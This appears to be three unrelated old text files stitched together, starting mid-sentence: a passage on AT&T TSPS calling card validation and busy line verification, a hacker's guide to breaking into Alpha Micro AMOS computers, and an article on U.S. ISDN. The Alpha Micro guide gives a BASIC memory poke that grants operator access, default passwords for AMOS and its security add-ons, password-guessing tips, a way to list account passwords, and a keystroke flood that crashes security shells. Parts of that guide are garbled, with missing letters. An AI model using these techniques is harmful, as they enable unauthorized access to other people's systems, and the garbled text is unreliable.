the BVA.  Connected in parallel to the BVA is the Network Call Denial (NCD),

which allows the call denial to AT&T customers with outstanding bills.



The CCS billing number consists of a 10 digit billing number and a 4 digit

PIN.  There are two categories that a CCS billing number can fall into and

they are as follows:



        - 7.0.1)  Directory Billing Number

         =================================

         - The billing number is usually the directory number to which the

           card is billed, and is in the following format: NPA-NXX-XXXX :

           Where the NPA represents Numbering Plan Area, N is a digit 2-9, and

           X is a digit 0-9.



         - 7.0.2)  Special Billing Number

          ===============================

          - Wheras the typical CCS billing number is discribed above in 7.0.1,

            here exists a special type of billing number that bills the card to

            a special nondirectory billing number.  The format for this type of

            card is as follows: RAO-(0/1)-XX-XXXX :  Where the RAO is the

            Revenue Accounting Office code which assigns the billing number.

            The X represents a digit 0-9.



The PIN is a 4 digit number in the format of NYYY, where N is a digit 2-9, and

Y a digit 0-9.  Each PIN is designated upon assignment to the customer as

either restricted or unrestricted.  An unrestricted PIN can place calls to all

destinations.  If the called number is the same as the billing number, only the

4 digit PIN need be entered by the customer.  A restricted PIN can only be used

for station calls to the billing number.  NOTE: A special billing number

(section 7.0.2) can only have an unrestricted PIN.





The CCS can be broken down into two basic category of calling types and are as

follows:



7.1  Customer Dialed CCS Call

=============================



The customer initiates the CCS sequence by dialing a 0 + Called Number.  The

Called number can take the format of a 7 digit number, a 14 digit number or

01+ country code and national number.  This information, as well the calling

number (originating) is received by TSPS from the CO.  OST is then used to

determine whether CCS is available/given to the customer.  Based on the

determined OST features (Does phone have Touch Tone?  Is it a coin station?..),

TSPS either routes the call to an operator or provides an alerting tone and

announcement to prompt the customer for the CCS number (in the format discussed

in sec 7.0).  Assuming no operator intervention, the CCS number is subjected to

a series of checks and queries detailed below. (sec 7.3)



7.2 Operator Dialed CCS Call

============================



There are several ways a customer can receive operator assistance in CCS

dialing.



        - 7.2.1)  0- call.

        - 7.2.2)  0+ Called Number +0

        - 7.2.3)  0+ Called Number +Switch-hook flash.

        - 7.2.4)  0+ Called Number +No Action.

        - 7.2.5)  0+ Called Number +OST feature information requiring operator

          intervention. Example: Call placed from rotary phone...

        - 7.2.6)  0+ octothorpe.  A customer dials an octothorpe

         ( pound key "#") after the initial 0.



When the position is seized if the operator determines that a CCS call is

requested, the operator keys in the CCS number (or the PIN only) and call is

subjected to a series for checks for validity, detailed below (sec 7.3)



7.2.1  Non-TSPS Dailed CCS Call

===============================



The TSPS operators do not serve all CCS users.  Non-TSPS operators and

independent telephone companies also serve CCS customers, and must access the

BVA for validity checks.(Examples: mobile,marine,international...)  This access

to the BVA is provided for cordboards and independent telephone companies by

reaching a nearby TSPS, via TSPS base unit inward trunks.  A distant operator

may reach the BVA by any of the routing codes detailed in section 4.2.6, and

the CCS validation is subject to the same security checks detailed below.  If

a non-TSPS operator dials either KP+(1161 or 1162)+ST, the operator hears a CCS

alert tone, and then has one minute in which to dial the 14 digit CCS number.

The TSPS initiates a format check, an APF check (see 7.3), and access the BVA

to determine the status of the CCS number in question.  The following are the

different corresponding announcements which would follow:



        - Calling Card Service Number Accepted, PIN unrestricted

        - Calling Card Service Number Accepted, PIN restricted

        - Calling Card Service Number Accepted, RAO unknown

        - Calling Card Service Number Rejected



If a CCS number is accepted, the connection to the non-TSPS operator is

terminated by the TSPS.  If a rejection message results, the operator will be

prompted by the alert tone and may attempt to redial the CCS.





7.3  CCS Validation

===================



After the CCS billing number is keyed in (either by customer, TSPS operator,

or independent operator) the All PINs Fail (APF) feature may cause the card to

be rejected and the call to be halted.  The APF is a security feature designed

to frustrate attempts at discovering valid PINs by a brute force hack method

(trial and error).  A list of CCS validation failures is maintained, which is

updated with both invalid billing numbers and calling numbers.  When a number

of failures for a given billing number exceeds a specified threshold, in x

amount of time, all subsequent attempts are declared invalid for a certain

amount of time y (Lock Out Time).  Even if the actual PIN is used during the

lockout time, the CCS number would be considered invalid, and the call process

would be halted.





7.4  Billed Number Screening

============================



The BNS service applies to collect and third party billing calls placed

through a TSPS operator.  The BVF contains information designating certain

numbers as "collect denied" or "bill-to-third denied".  Each time an operator

attempts to place a collect or third party billing number a BVA and a NCD

inquiry are made.









8.0  Busy Line Verification

===========================



A dedicated network is provided to process BLV calls and traffic.  This network

originates at the TSPS base office and connects through dedicated trunks to

toll, intertoll, and local offices.  The equipment consists of the BLV trunk, a

TSPS-4 wire bridging repeater, a verification circuit at TSPS, InComing

Verification Trunks (ICVT), OutGoing Verification Trunks (OGVT) at both toll

and intertoll offices, and Incoming No Test Trunks (INTT) at local offices.

The TSPS gains access to a single local, toll, and/or intertoll office.



The initial request for a BLV appears as an position seizure to a TSPS operator

over an incoming trunk via a local office or as an inward trunk via a toll

office.  The initial loop seized becomes the originating loop and is connect in

position via an idle TSPS loop.  In that the originating loop cannot be

connected to the verification loop, the operator must switch between the two.



Security is maintained to insure that a customers privacy is not violated, and

consists of the following:



        - 8.0.1)  Speech Scrambler at Console Level (not BLV trunk level).

        - 8.0.2)  Alert Tone Generator (ATG).

        - 8.0.3)  Translation of the NPA to 0XX or 1XX.

        - 8.0.4)  Dedicated BLV trunks.

        - 8.0.5)  Cross office security checks at toll offices.



8.1  BLV Processing

===================



When a customer requests that a BLV be preformed on a certain number within

the TSPS's LAN the following actions are taken.



        - 8.1.1)  The TSPS attempts to DDD the number in question , to confirm

         that the number is indeed busy.  This action is preformed so that if

         in the event that an recorded error announcement is reached, the

         operator may understand the nature of the error without the speech

         scrambler interfering in quality.



        - 8.1.2)  If the line is confirmed to be busy and the customer requests

         further action, the operator then attempts verification through the

         BLV network. The operator then presses the VFY key, in which case an

         attempt at a BLV will be made if and only if the following conditions

         are met:



               - 8.1.2.1)  There is an idle loop at the position

                 ===============================================

                 - This condition must be met because the BLV trunk must be

                   placed in a loop with the Traffic Service Position.  If

                   there are no idle loops remaining the BLV cannot be

                   processed.  This condition can be gotten around by the

                   operator pressing the POS TRSFR key, which causes all the

                   calls in the hold state to be transferred to loops on the

                   original operator position.



                - 8.1.2.2)  The call is on an incoming/inward trunk

                   ================================================

                   - This insures that an operator cannot preform a BLV

                     without a originating customer request.



                - 8.1.2.3)  The called party is off-hook

                  ======================================

                  - See 8.1.2.2



                - 8.1.2.4)  The called number is a domestic number

                  ================================================

                   - That is the called number cannot be an overseas number.



                - 8.1.2.5)  The call has no forward connection

                  ============================================

                  - This ensures that the busy condition detected by the INTT

                    is not due to the connection of the calling party.



                - 8.1.2.6)  The line number can be verified

                  =========================================

                   - This condition would fail if the local office is

                     not served by the BLV network...



                   - ..or the number in question is excluded from BLV calls

                    (Example: Emergency or Police Lines...)



        8.1.3)  The BLV is preformed and the BLV trunk dropped by pressing

                the REC MSG key for an incoming call or VFY for an inward call.

The Alpha Micro computer is a fairly easy system to understand, for

those of you familiar with VAX systems.  The operating system (AMOS)

is a ripoff of the DEC stuff, so many commands are similar.  This is

a guide on how to use the Alpha.



Background on security:

---------- -- ---------



When the Alpha Micro leaves the factory, they do not have any type of

security feature built into it, except for certain higher end models,

which will be discussed later.  Thus, if the user installs a modem

directly to the system, and you call in, you'll be at the OS level

already.  Pretty easy, eh?



Due to the lack of a cursor display character, the pound sign (#) will

be used to represent the cursor throughout this document.  The prompt

for AMOS is a period, which users refer to as the dot.  Wnen you log on,

you'll see this:



        .#



At this point, you can type away and use the various accounts and

programs on the system.  When you first connect, depending on how the

last user left the modem, you may or may not be logged in to a

partition.  To verify this, type in the LOG command.



        .LOG



The computer will respond in one of two fashions.  If it says "Not

logged in", then you will have to log to an existing account.  If it

says "Current login is DSK1:[203,1]", then there is no need to scan

for an account right away.



Perhaps the most important thing to do after this is to do a SYSTAT,

which will let you know who else is on the system, and what account,

program is being run, and other info.  Example:



        .SYSTAT



Status of AMOS/L version 1.3D(165) on Friday, November 11, 1988 03:24:54 PM



JOB1  TRM1  DSK1:201,3  0067732 ^C CONECT 122880 bytes at 4505554

JOB2  TRM2  DSK0:1,2    0024984 TI SYSACT 176800 bytes at 4505554

JOB3  TRM3  Not logged  0015460 ^C MEMORY  12288 bytes at 3137554

MODEM HAYES DSK0:1,4    0037325 SL SYSTAT  67912 bytes at 2179023



4 jobs allocated on system, 3 jobs in use (3 logged in)

Total memory on system is 2048K bytes

System uptime is 07:28:19



DSK0        26402 blocks free                DSK1        3578 blocks free

4 devices on system, total of 29980 blocks free



        .#



Here's a quick rundown on what each column means...

Col 1: The name of the job

Col 2: The terminal to which the job is attached

Col 3: The device and account into which the job is logged

Col 4: The octal memory address where the JCB is located

Col 5: Terminal status of for that job

Col 6: Last program run by that job

Col 7: Number of bytes (decimal) of memory allocated

Col 8: Octal memory address for beginning memory partition



The rest is self explanatory.  The 5th column (terminal status) has

numerous codes which need to be given.  Here's the abbreviation and what

it stands for:



        TI        Terminal input wait state

        TO        Terminal output wait state

        LD        Program load state

        SL        Sleep state

        IO         I/O access other than terminal

        EW        External wait state

        RN        Running

        SP        Suspended state

        SW        Semaphore wait

        ^C        Control-C



The SYSTAT program can be used even when you are not logged in, which

is a plus if you wish to access an account without knowing the password.

There is another program, called STAT, but don't use this.  It

constantly updates the screen, and will mess you up if you're using a

modem.



Before going further, it should be mentioned on how the Alpha Micro

computer is structured.  On each system, a number of hard drives

subdivided into logical units are encountered.  These may be named in

any fashion by the sysop, following only the limitation of the LU being

three letters or less in length.  This is then followed by the device

number.  Sample LU's may look like:  DSK0:, DSK1:, WIN0:, HWK3:, etc.



On each disk is found a grouping of accounts, also known as partitions,

or PPN's (project, programmer number).  It is in these accounts where

you log in to, and execute programs.  These are enclosed in square

brackets [], to separate them from the disk specification.  When used

all togther, it looks like this:



DSK0:[1,2], DSK0:[1,4], WIN3:[100,0], DSK4:[377,7]

You have to be careful with how the programs are used.  If done

inappropriately, you could do major damage to the computer.  Many of

the above programs can only be executed from the operator account

DSK0:[1,2].





+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



Entering via BASIC:



There is a back door in the version of BASIC that comes bundled with

AMOS.  Depending on the type of security present, you can gain access

to the system operator account (DSK0:[1,2]), which gives you the power

to do quite a few things.  What the command essentially does is poke

into memory the appropriate values to give you sysop access.



Type this in at the dot prompt (.) :



.BASIC



AlphaBASIC Version 1.3 (217)



READY



#



Once inside BASIC, type in this command as seen below;  it doesn't

matter if you use upper or lower case.



WORD(WORD(1072)+20)=258



BYE



.#



The BYE command exits you out of BASIC and puts you back at the

OS level.  You can also rename files and open files via BASIC.



Depending on the security in the system, if you typed in everything

as above, you should be logged into DSK0:[1,2], also known as OPR:.

This is the system operator's account, from which all types of

commands can be issued.



+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



When you finally get connected to the system, you need some place to log

in to.  There are certain default accounts on every system.  These are:



        OPR:  --> DSK0:[1,2]                SYS:  --> DSK0:[1,4]

        DVR:  --> DSK0:[1,6]            CMD:  --> DSK0:[2,2]

        LIB:  --> DSK0:[7,0]                HLP:  --> DSK0:[7,1]

           BOX:  --> DSK0:[7,2]                BAS:  --> DSK0:[7,6]

        MAC:  --> DSK0:[7,7]



While logging around to the different accounts, some will have defined

"ersatz" names.  This means that besides the [p,pn] specification, you can

access that account with a defined name.  In the above examples, logging

into SYS: is the same as logging into DSK0:[1,4].





As mentioned previously, older models of the Alpha Micro did not have any

security built in to them.  Later versions of the operating have changed

this, though.  Once you get connected and you try to log into an account,

you may be asked for a password.  The word you type is not echoed on your

screen.  Two default passwords that you can try for logging purposes are

"DEMO" and "SYSTEM SERVICE".  These are not case-sensitive, so you can

type them in either upper or lower case.  If neither of these work (which

is unlikely, since people are too lazy to change them), try running the

SYSTAT command.



What happens is that you will often see people logged in under a short

(6 digits or less) user name, such as JOHN, AMY, SUSAN, etc.  Try logging

in with one of these as your PW.  80 per cent of the time it will work.



If you've gotten into the system this far, then good.  There are lots

of things to do or access.  If you're looking around for information,

these are contained in files that end in a .TXT extension.  These may be

examined by using the TYPE command from AMOS.  The syntax would be:



        .TYPE MODEM.TXT/P



The /P is not required, but is useful, because otherwise the file would be

diaplayed too quickly for you to look at.  The /P switch displays the

contents one page at a time.  Pressing <RET> will scroll through the text.

One word of warning:  Don't use the TYPE command on .LIT, .SBR, or .OBJ

files; doing so will usually result in your terminal being locked up,

effectively ending your session.



Now let's say you wanted to check out the files that are in other accounts.

Usually all that is needed is to simply log there.  However, certain

accounts will be passworded.  There is no simple way to just dump the

contents of a disk block and see what the PW is.  There are alternatives,

however.  One method is to log into the operator account (DSK0:[1,2]) and

use the SYSACT command.  This lets you to various things to the disk, but

the one you would be concerned about lists all of the accounts on a parti-

cular disk.  The command works like this:



        .#

        .SYSACT DSK0:



Use the "H" to get a listing of all the available commands from within

SYSACT.



        *

        *h

        Implemented commands are:

        A PPN        - Add a new account

        C PPN         - Change password of an account

        D PPN        - Delete an account

        E        - Rewrite MFD and exit to monitor

        H         - Help (Print instructions)

        I        - Initialize entire disk

        L        - List current accounts



The last one "L" is the one we're concerned with.  Press <RET> after it to

see a listing of all the accounts on the disk.  Passwords (if any) will be

displayed to the right.  The "C" option will allow you to change the PW on

an individual account.  Then press "E" to go back to the command level.



If you want to check out a file a little less elegantly, this may be done

by simply copying the file to an unpassworded account or by typing the

file from another account.



+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



Account and file structure:



As explained before, there are accounts on the disk, which may or may not

contain files in them.  AMOS maintains this account structure on the disk.

In fact, a listing of which files belong in what account are kept track of

in the account directory.



There are two types of files that are possible on the Alpha Micro:

sequential (linked) and random (contiguous) files.  Each block is 512 bytes

y.  Files may not overlap

onto another disk, and each disk block has a unique number by which it is

referenced to via AMOS.



The format of most Alpha files are sequential -- AMOS reads in each disk

block of the file, which tells it the disk address of the next disk block.

The key point is that to access one block of data, you have to access all

preceding blocks.



When AMOS writes a sequential file to the disk, it looks for the first free

disk block.  It writes a copy of the first file block into that disk

location.  Next, it looks for another free disk block.  This next disk block

may or may not be anywhere near the first block used.  This process goes on

until the entire file is transferred to the disk.  The disk blocks that make

up the file may be scattered across the disk.  Each disk block in the file

contains a portion of the file; it also contains the address of the next

disk block used by the file.



              *-----------*-----------*

              | Address of| Data in   |

              | next block| file block|

              *-----------*-----------*



Sequential files are also called linked files because the disk blocks are

linked together by the information in each block that points to the address

of the next disk block.  The last block in the file is designated as such

by a link of zero.  It looks like this:



                                                     /---X

     /----------------X       /----------------X     !    |

     !                 !      !                 !    !    X

*-----------*--------* ! *-----------*--------* !  *----------*-------*

| Address of|  DATA  | ->| Address of|  DATA  | !->|  EOF     | DATA  |

| next block|        |   | next block|        |    | Zero link|       |

*-----------*--------*   *-----------*--------*    *----------*-------*





Random files differ from their sequential counterparts because the data in

them can be accessed randomly.  AMOS knows how long the files are, and also

knows exactly where the files begin on the disk.  The operating system can

therefore access any block in a file by computing an offset value from the

front of the file, and then reading the proper disk location.  The distinc-

tion between random and sequential is that since the disk blocks don't have

to be accessed in any particular order, AMOS can locate specific data in a

file quicker.



When a random file is written to disk, the first free groups of contiguous

blocks are searched for which are large enough to hold the entire file.  If

there aren't enough blocks on the disk, the message "Disk full" appears.

Random files look something like this:





  *---------------*---------------*---------------*---------------*

  | File block #1 | File block #2 | File block #3 | File block #4 |

  *---------------*---------------*---------------*---------------*



One a random file is allocated on the disk, it is not possible to expand it.

Random files are used mainly for applications where the file length remains

constant.





The first block on a disk (block 0) is the disk ID block.  Alpha Micros use

this disk block to maintain permanent identification information about the

disk.  The next block (block 1) is the Master File Directory (MFD).  At

block 2 lies the disk bitmap.  The bitmap is the structure that keeps track

of which blocks on the disk are in use, and which are available.  The

bitmap contains one bit for each block on the disk.  If a block is in use,

the bit in the bitmap that represents that disk block is a 1; if the block

is available for use, its bit in the bitmap is a 0.  The bitmap is perma-

nently stored on the disk beginning with block 2 and extending as far as

necessary.  The last two words in te bitmap form a hash total.  If some

data in the bitmap becomes destroyed, then there is a chance that data

corruption has occurred.  The ocre for writing data to the disk is:



   [1] Find in memory a copy of the bitp of the disk to be accessedd.

   [2] Computer the hash total of the bitmap & check agains the sh.

   [3] Consult bitmap to see the next free block.

   [4] Change bitmap to shockthe block is in use.

   [5] Recompute bitmap hash to reflect the modified bmap.

   [6] Write modified bitmap back out to the disk.

   [7] Write thata to the chosen block.



Every disk contains one Master File Directory (MF  Each disk contains

one MFD.  The MFD is one block long, and contains e entry of four words

for each user account allocated on that disk.  This ps the limitation

of having a maximum of 63 user accounts per disk.



Each try in the MFD identifies a specific acct directory.  Individual

account dectories are known as User File Directories (UFDs).  The entry

contains thccount PPN, number of the first block used by the UFD, and

a password assned (if any).  The MFD contains one entry for every UFD

on the disk.One UFD exists for each user account; it contains one entry

for eachlein that account.  These contain various sorts of information

relating tthe file.  A UFD may consist of more than one disk block; if

it is larger than oblock, the first word of the FD is nzero and gives the link

to the next UFD bock.



++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++



Since the existing security  the Alpha Micro is lax, third party

comiehave wriiten their own sceurity systems, making it considerably

more dicult to access a system.  However, all is not lost.  There are a

few wato make things easier.



Default passwords are the first step.  One of the security systems, known

as TSASS, has the default passwords of MAL, MAL, MAL for its prompts.  You

will know that you've encounted an Alpha Micro running TSASS by the

message: "Welcome to a Time Shar and Security System".  Another security

package, UltraSafe, has the dult PW's of OPR, OPR, OPR.  An UltraSafe

system is harder to recognize because the prompts can be changed, although

some more common ones ask for  NAME, PORD, and GROUP.



The next option is if you have found a password that lets you in, it may be

one of low security.  This can automatically chain you into a menu or shell

program.  Depending onw the system is configure, a string of Control C'or any

other key sequence) can mess up the buffer, automatically causing

e curity system to crash, and bringing you to AMOS, without being

confined to the security program.  The input must be typed in rapidly, or

it won't work.  This method works for both TSASS and UltraSafe.



Note:  This file is written for informational purposes oy, to give

you an idea of the workings of computer security for the Al Micro

Operating System (AMOS).  If you want more information on the inner workings of

this operating system, then get in touch with me.

PREFACE:  The integrated services digital network (ISDN) is a long-range

plan for systematically upgrading the televommunications networks of various

countries to provide both voice and data services on a single physical network.

European countries have been the major force behind degining ISDN.  The U.S.

however, will require a variant of ISDN, because its communications

industry operates in a competitive user-oriented environment.  This article

describes the differences in implementation and services that can be expected

with USDN (the U.S. version of ISDN) and identifies unresolved issues that

should concern the data communications manager.



INTRODUCTION

------------



  The ISDN proposal has recieved worldwide attention for at least a decade.

Constrained by an apathetic marketplace, technical limitations, economic

considerations, and the slow pace involved in establishing acceptable

world-wide standards, implementation of ISDN has occured principally in

laboratories only.



  The International Telegraph and Telephone Consultative Committee (CCITT)

has attempted to define and obtain general consesus regarding ISDN

objectives, interfaces, services, and standards.  The CCITT-backed ISDN

principally represents European interests.  Although the U.S. is repre-

sented in the CCITT and offers support for its programs, the major

telecommunications organizations in the U.S. are more interested in estab-

lishing their own standards and programs.  So, while ISDN seems to be

gaining more U.S. support, it continues to reflect a European perspective.

Recently, the term USDN has been used to distinguish the modifications to

ISDN that are expected to evolve in the U.S.  The USDN concept is one of

integrated access to multiple networks, rather than the integrated services

on one network approach of the ISDN proposal.



  The U.S. telecommunications industry has long recognized that ISDN would

have a somewhat modified personality in the U.S. Several industry-wide

ISDN conferences addressed the U.S. equivalent to ISDN, but none of the

conference comittees proposed that the U.S. adopt ISDN totally, be-

cause of the unique characteristics of the U.S. communications environment.



THE U.S. COMMUNICATIONS ENVIRONMENT

-----------------------------------



  The unique U.S. communications industry characteristics that influence

the USDN effort are described in the following section.  These characteristics

are summerized in Table 1, which compares the U.S. communications environment

with the environment in other countries.



  The Competitive Marketplace:  In the U.S., the privately managed telephone

industry responds, rapidly to user demands for new services.  In most other

countries, however, services are established in a slow, deliberate program

by one government-administrated source, usually the country's postal,

telephone, and telegraph (PTT) agency.  The users then decide if and how

they will use the services offered.



  Technology Advances:  Second only to the competitive marketplace, technology

advances include component developments such as as memory devices, VLSI

chip design, and optical elements.  Developments in the system architecture,

networking, and functional interfaces in transmission and switching

technologies are equally important in defining the USDN concept.



  Less Restrictive National Standards:  Because standards imply conformity,

they can restrain innovation.  Because they are not required to undergo a

lengthy standards-approval cycle, U.S. manufacturers are free to produce

systems that are incompatible with existing equipment.  De facto standards

are often established by the market's acceptance of a particular system.

  Multiple Carriers and Competative Networks:  The premise of ISDN is that a

common national network will evolve, able to handle multiple voice and data

services in an integrated fashion.  ISDN thus precludes a carrier by-passing

a local office or vying for customers' traffic through innovative techniques.

In most countries other than the U.S., telephone companies are not legally

required to provide or counter new service offerings.  Integrated digital

networks (IDNs) are emerging in the U.S. that provide digital access and

transmission, in both circuit-switchhed and packet modes.  The number of

IDNs will probably increase regardless of whether an ISDN is proposed for

the U.S.



  Embedded Investment:  The U.S. has invested heavily in modern stored-program

controlled (SPC) switching.  However, other countries are only now facing

conversion to SPC, as much of their existing systems investment is

greatly  depreciated.  These countries can therefore converty to ISDN

switching in a more orderly and economical fashion that the U.S. can.  Thus

the U.S. will have overlay networks, digital adjuncts to existing SPC

switches, and multiple networks in the foreseeable future.



EVOLUTION OF U.S. COMMUNICATIONS OFFERINGS

------------------------------------------



  The American solutions to data transmission problems have tended to be

faster, more practical, and less elegant than those evolving in Europe.

Not surprisingly, the American solutions have generally ignored  CCITT

recommendations.  For example, public packet-switched networks such as TYMNET,

GTE Telenet, and Satellite Business Systems are offered to some customers

with long-haul traffic.  These systems were severly limited because they

often required access through analog local office.  Many major industries

and private organizations thus established their own data networks, often

point to point over leased circuts.  Digital Terminating Service was

introduced to provide 56K bit-per-second (up to 448K bit-per-second)

links to the end user over special transmission links.  Digital Electronic

Message Service was recently approved to provide 1.5M bit-per-second service

to the end user.

  Some suppliers are now offering PBXs with 64K bit-per-second local loops

and direct pulse code-modulated (PCM) trunks to the public network.  Two

new standard 1.544M bit-per-second central office-to-PBX interfaces have

been established, the Northern Telecom Computer-to-PBX-interface and

the AT&T Information Systems Digital Multiplexed Interface.



  The Development of Local Area Networks:  The increasing use of data

terminals and the growth of distributed processing has led to the necessity

of transporting data at rapid rates within a building or local area.

This rapid local data transmission imposed impossible requirements on the

conventional PBX.  While PBX designers struggled to upgrade their data

capabilities, computer manufacturers saw the oppertunity to offer local

area networks (LANs) designed specifically to provide wideband data transport

between users in a limited area.  Again, expediency and the competitive

climate produced a practical solution - several LANs with different

architectures and protocols.   In general, these LANs so not conform to the

ISDN protocol levels identified in the International Standards Organization

(OSI) models.  However these LANs cannot be eadily replaced, so the USDN

will have to accommodate them.

  A case in point is the apparent conflict between the ISO model of Open

System Interconnection (OSI) and the IBM System Network Architecture (SNA).

The OSI model of a seven-layered architecture for data networks has been

defined for the first four layers only.  International agreement on the

remaining protocols will take several more years to obtain, if agreement on

the remaining protocols will take several more years to obtain, if agreement

is possible, Meanwhile, in the U.S., IBM defined a similar protocol, SNA,

and has implemented numerous networks.  Long before any ISO standard can be

established, the U.S. will be well populated with SNA systems.  The USDN

must be at least compatible with SNA, and SNA could become the national

standard.

  Because future PBXs will probably be able to switch synchronous data at

64K bits per second (and multiples therof, up to at least 1.544M bits per

second), there may not be sufficient switched wideband traffic requirements

to support a seperate LAN standard.  Long-distance dedicated data services

such as AT&T's ACCUNET and SKYNET are competing for data traffic.  In

addition, various data-over-voice (DOV) schemes have been employed over

switched analog circuts.  In short, many approaches, services, and facilities

have already been implemented to satisfy the immediate market needs, without

regard to an orderly transition to ISDN.  Thus, the USDN will have to

accomodate thesee established services and inteface with most of them.



  Introduction of Local Area Data Transports:  Recently, electronic (carrier)

serving areas have been replacing long local physical loops.  These

subscriber carrier systems provide such data capabilities as DOV and local

area data transport (LADT).  LADT offers a packet-switched data capability

that may apply to both business and residential services;  its low speed

(up to 4.8K bits per second) and relatively low cost may make it universally

attractive.  LADTs may find widespread use for Videotex, meter reading,

power load shedding, security reporting, and marketing transactions.

  Although LADT is restricted primarily to a local exchange area, the

evolving USDN will provide transport between LADTs.  LADT subscribers will

access the USDN transport carrier through pooled local data concentrators.

A typical LADT Data Subscriber Interface (DSI) unit will concentrate data

from 124 subscribers to a 56K (or 9.6K) bit-per-second trunk to a packet

network.  A subscriber can thus dial up a DSI over a conventional voice

loop and transport data through a modem (which may be a part of the

terminal) by means of the switch.  A direct access mode is also available

with the subscriber loop terminating on the DSI, permitting independant

simultaneous data and voice transmission.  The X.25 link access protocol-

balanced (LAPB) is used, but protocol conversion is restricted in many

instances by federal rules.  Although LADTs so not comply with any defined

ISDN service, they are an integral requirement of the USDN.



  CSDC Technology:  Circut-switched digital capability (CSDC) is another

USDN service that has no ISDN counterpart. CSDC is an alternative voice-

or data-switched circut with end-to-end 56K (or 64K) bit-per-second

transparent connection ensured by dedicated trunk groups in each

switching location.  CSDC facilitates large, continuous, bulk data trans-

fers, and its implementation requires added investment in each switch

location as special terminal equipment.  CSDC represents yet another

expediant toward providing ISDN-like services while using existing investment.

CSDC technology can also accomodate a full ISDN, if one ever evolves in the

U.S.



  Digital Subscriber Loops:  ISDN-compatible digital subscriber loops (two

voice, plus one data channel at 144K bits per second) are recieving attention

in the U.S., but the commercial implementation of this technology is not

prograssing rapidly.  Near-term subscriber loops will probably acquire data

capability by data ober analog voice multiplexing.  Although this step

would not precluse the eventual inclusion of ISDN loops, it would tend to

slow their introduction and widespread acceptance.



  Interfaces and Protocols: Although the ISDN revolves around the 30 channel

PCM transmission format used in Europe, it does provide for the 24 channel-

based systems used in the U.S.  However, U.S. systems have many unique

interface requirements.  A new set of proposed services will require

forwarding of the calling number for control or processing by either the

terminating switching system or the called subcriber.  Exchange of such

information will likely be accomplished over a local area common channel

signaling system or a fulll CCITT standard, signaling system #7 network.

  Direct data exchange between a network switching unit and a sata bank

and/or processor facility will probably evolve from the current trunking

scheme to a direct signaling carrier, perhaps CCITT standard #7 with OSI

and/or SA protocols.

  Calls to cellular mobile roamers (i.e., mobile units that have traveled

outside their base area) will probably be routed to a central data base for

locating routes.  A personal locator service for automatically routing calls

to the unit's temporary location will require unique system interface and

protocols.  Privately owned transaction networks may provide this unique

interface.  While the objective is to eventually use CCITT standard #7 as a

vehicle and X.25 as an interface protocol, the USDN must embrace a wide

assortment of formats, protocols, and interfaces for the near future.



TRANSMISSION TECHNOLOGY TRENDS



  Ultimately, subscriber loops in the U.S.  will be digital, providing two

64K bit-per-second voice or data channels (i.e.,two B channels) and one 16K

bit-per-second voice or data channels (i.e., two B channels) and one 16K

bit-per-second data only (i.e., one D channel).  The 16K bit-per-second

channel will probably permit an 8K bit-per-second user data channel or

submultiplexed channels of a lower bit rate.  Full-duplex (i.e., four wire)

operation will be provided by echo-canceling techniques over existing

two-wire loops.  An alternative approach of time-domain multiplexing may

also be used, especially in the neat term.





  Local Loops:  Although modems will not be required at either end of the

local loop, network terminating equipment will be required to serve as the

multiplexor and, perhaps, as voice CODECs.  Users of such circuts can have

full, simultaneous, reall-time voice and data channels, as well as seperate

control, metering, and low-speed data transmission.  With advanced

switching centers, each circut can be routed and billed independently.

Existing 56K bit-per-second channels on conventional 24-channel digital

carrier systems will be replaced by or supplemented with 64K bit-per-second

clear channels with extended framing.

  The local loop plant in many areas is already migrating toward carrier-

serving areas, implemented by a subscriber carrier capable of digital

transmission.  Some local telephone companies are installing glass fiber in

their local plants in preparation for the downward migration of direct

digital transmission.  However, until full, ISDN-type local loops are

universally available, near-term adaptations will be offered to satisfy

market needs and to prevent users from seeking other communications

facilities.



  Wideband Circuts:  Wideband circuits (i.e., multiples of 64K bits per

second) over the public switched network may become feasible as newer

switching elements are used.  Although some transmission links may soon

be able to combine DS-O channels for real-time wideband service, limitations

in switching centers will restrict their general use.  Seperate wideband

switching modules, multiplexing on CATV, or extension of wideband LANs may

ultimately appear if the need for wideband transmission remains strong.



  Packet Transmission:  Packet transmission is an inherent element of the

ISDN.  However, the USDN must handle separate packet networks, separate

facilities, separate routing, and even separate providers.  It is unlikely

that American packet networks in the U.S. will ever be combined into an

integrated, single-network ISDN.  Therefore, the USDN must accommodate such

overlay networks and the associated problems of routing, protocol conver-

sion, circuit maintenance, billing, and network management.  American users

will demand and recieve more options for data transport, data processing,

and support services than any single network is likely to provide.



SWITCHING TECHNOLOGY TRENDS



  Implementing ISDN standards on the switching systems already in place

throughoout the U.S. is a formidable task.  Most local end offices have

been replaced by SPC analog switches within the past decade.  More recently,

SPC digital switches have been installed, and this trend will probably

accelerate through the 1990s.  However, these newer switches are third-

generation design; that is, they are designed primarily to handle conventional

voice circuit switched traffic within a hierarchical network.  These switches

are not optimized for data handling, multiple networks, or sophisticated user

needs.  Although hardware retrofits and software patches are being applied to

accommodate LADT, CSDC, and digital loops, such solutions result in limited

user services, higher costs, and more complex maintenance requirements.



  Fourth-Generation Switching:  Fourth-generation switching systems, design-

ed for USDN requirements, are beginning to appear.  A fourth-generation

switch is optimized for data; voice switching is simply a special case of

data transmission at speeds of 64K bits per second, 32K bits per second,

or any other evolutionary compressed voice bit rate.  Fourth-generation

switches do not have central processors.  Each functional unit (e.g., lines

or trunks) contains its own processing hardware and software to output

packet-format messages (i.e., containing a header message and a data byte)

in a uniform deferred format.  (The data byte may be a digitized voice sample.)

These packets then are routed through a central matrix, which also contains

sufficient processing power to route packets to their interim or final

destination with only the data contained in the header bits of the call

itself.

  Services such as route translation, tone reception, billing recording, and

termination functions are inserted into a call in progress by routing the

call packets to specific functional modules on demand.  The modules perform

the required call functions and return the packetsto the matrix. (or interal

network).  When the required call-handling functions have been sequentially

accomplished, the call is terminated to the desired port and a virtual

circuit is established between the calller and called terminals.  During

the call, the packet header provides control and supervision and performs

routine maintenance and alarms.

  A fourth-generation switch performs required functions-Centrex attendants,

toll operators, common-channel signaling, or LAN termination-when the

appropriate module is simply plugged in.  These functions do not affect

existing system service or capacity.  Ideally suited to the USDN, the fully

distributed  control architecture of a true forth-generation switch

could also meet the longer-range objectives of the ISDN.

  Because they do not require a large, costly central processor complex,

fourth-generation switches can be economically applied as add-on units or

